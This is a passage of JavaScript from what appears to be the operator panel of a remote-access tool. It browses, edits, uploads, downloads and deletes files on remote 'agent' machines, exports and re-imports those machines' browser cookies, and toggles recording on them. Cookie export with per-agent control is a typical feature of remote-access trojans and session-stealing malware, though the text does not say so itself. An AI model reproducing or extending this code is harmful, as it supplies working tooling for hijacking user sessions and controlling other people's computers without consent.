});
fmPath.addEventListener("keydown", e => { if (e.key==="Enter") document.getElementById("fm-go").click(); });

socket.on("dir_result", d => {
  if (!d) return;
  fmPath.value = d.path||"";
  fmList.innerHTML = "";
  fmEditor.classList.remove("show");
  if (d.parent) {
    const row = document.createElement("div");
    row.className = "fm-row";
    row.innerHTML = `<div class="fm-icon">⬆</div><div class="fm-name">..</div>`;
    row.addEventListener("click", () => socket.emit("list_dir", { path:d.parent, _target:currentAgent }));
    fmList.appendChild(row);
  }
  (d.items||[]).forEach(item => {
    const row = document.createElement("div");
    row.className = "fm-row";
    row.innerHTML = `<div class="fm-icon">${item.type==="dir"?"📁":"📄"}</div><div class="fm-name">${esc(item.name)}</div><div class="fm-size">${item.type==="file"?fmtBytes(item.size||0):""}</div><button class="fm-del">🗑</button>`;
    row.addEventListener("click", e => {
      if (e.target.classList.contains("fm-del")) return;
      if (item.type==="dir") socket.emit("list_dir",{path:item.path,_target:currentAgent});
      else socket.emit("read_file",{path:item.path,_target:currentAgent});
    });
    row.querySelector(".fm-del").addEventListener("click", e => {
      e.stopPropagation();
      if (!confirm("Delete "+item.name+"?")) return;
      socket.emit("delete_path",{path:item.path,_target:currentAgent});
    });
    fmList.appendChild(row);
  });
});

socket.on("file_data", d => {
  if (d.error) { toast("Cannot read: "+d.error, "error"); return; }
  _editingPath = d.path||"";
  _editingB64  = d.data||"";
  document.getElementById("fm-editor-path").textContent = _editingPath;
  // Try to show as text; fall back to hex message for binary
  try {
    const bytes = Uint8Array.from(atob(_editingB64), c=>c.charCodeAt(0));
    document.getElementById("fm-textarea").value = new TextDecoder("utf-8",{fatal:true}).decode(bytes);
  } catch {
    document.getElementById("fm-textarea").value = "[binary file — use ⬇ Download to save it]";
  }
  fmEditor.classList.add("show");
});

document.getElementById("fm-save").addEventListener("click", () => {
  if (!_editingPath || !currentAgent) return;
  const text = document.getElementById("fm-textarea").value;
  const b64 = btoa(unescape(encodeURIComponent(text)));
  socket.emit("write_file",{path:_editingPath,data:b64,_target:currentAgent});
});

document.getElementById("fm-download").addEventListener("click", () => {
  if (!_editingB64 || !_editingPath) return;
  const bytes = Uint8Array.from(atob(_editingB64), c=>c.charCodeAt(0));
  const blob = new Blob([bytes]);
  const a = Object.assign(document.createElement("a"),{
    href: URL.createObjectURL(blob),
    download: _editingPath.split(/[\\/]/).pop()
  });
  a.click(); URL.revokeObjectURL(a.href);
});

// Upload a local file to the current remote directory
document.getElementById("fm-upload-btn").addEventListener("click", () => {
  document.getElementById("fm-upload-input").click();
});
document.getElementById("fm-upload-input").addEventListener("change", function() {
  const file = this.files[0];
  if (!file || !currentAgent) return;
  const remotePath = (fmPath.value || "").replace(/[\\/]$/, "") + "\\" + file.name;
  const fr = new FileReader();
  fr.onload = e => {
    const b64 = e.target.result.split(",")[1];
    socket.emit("write_file",{path:remotePath,data:b64,_target:currentAgent});
    toast("Uploading "+file.name+"…");
  };
  fr.readAsDataURL(file);
  this.value = "";
});

socket.on("write_result", d => toast(d.ok?"Saved.":"Save failed: "+d.error, d.ok?"success":"error"));
socket.on("delete_result", d => {
  toast(d.ok?"Deleted.":"Delete failed.", d.ok?"success":"error");
  if (d.ok) socket.emit("list_dir",{path:fmPath.value,_target:currentAgent});
});

/* ── Cookies ─────────────────────────────────────────────── */
const cookieStatus = document.getElementById("cookie-status");
document.getElementById("btn-export-cookies").addEventListener("click", () => {
  if (!currentAgent) return;
  cookieStatus.textContent = "Exporting cookies…";
  socket.emit("export_cookies",{_target:currentAgent});
});
socket.on("cookies_data", d => {
  if (d.error) { cookieStatus.textContent = "Error: "+d.error; return; }
  _exportedCookies = d.cookies||[];
  cookieStatus.textContent = `Exported ${_exportedCookies.length} cookies. Download started.`;
  const blob = new Blob([JSON.stringify(_exportedCookies,null,2)],{type:"application/json"});
  const a = Object.assign(document.createElement("a"),{href:URL.createObjectURL(blob),download:(currentAgent||"cookies")+".json"});
  a.click(); URL.revokeObjectURL(a.href);
});
document.getElementById("btn-import-cookies").addEventListener("click", () => {
  if (!currentAgent) return;
  if (_exportedCookies) { socket.emit("import_cookies",{cookies:_exportedCookies,_target:currentAgent}); return; }
  const inp = document.createElement("input");
  inp.type="file"; inp.accept=".json";
  inp.onchange = () => {
    const fr = new FileReader();
    fr.onload = e => {
      try { const c=JSON.parse(e.target.result); socket.emit("import_cookies",{cookies:c,_target:currentAgent}); }
      catch { cookieStatus.textContent="Invalid JSON."; }
    };
    fr.readAsText(inp.files[0]);
  };
  inp.click();
});
socket.on("import_result", d => { cookieStatus.textContent = d.ok?"Import done: "+(d.message||"OK"):"Import error: "+d.message; });

/* ── Recording ───────────────────────────────────────────── */
let _recording = false;
const recIndicator = document.getElementById("rec-indicator");
const recLabel     = document.getElementById("rec-label");
const recBtn       = document.getElementById("rec-btn");
recBtn.addEventListener("click", () => {
  if (!currentAgent) return;
  _recording = !_recording;
  socket.emit("command",{action:_recording?"start_recording":"stop_recording",_target:currentAgent});
  recIndicator.classList.toggle("recording",_recording);
  recBtn.textContent = _recording?"Stop Recording":"Start Recording";
  recBtn.classList.toggle("stop",_recording);
  recLabel.textContent = _recording?"Recording…":"Not recording";
});
</script>
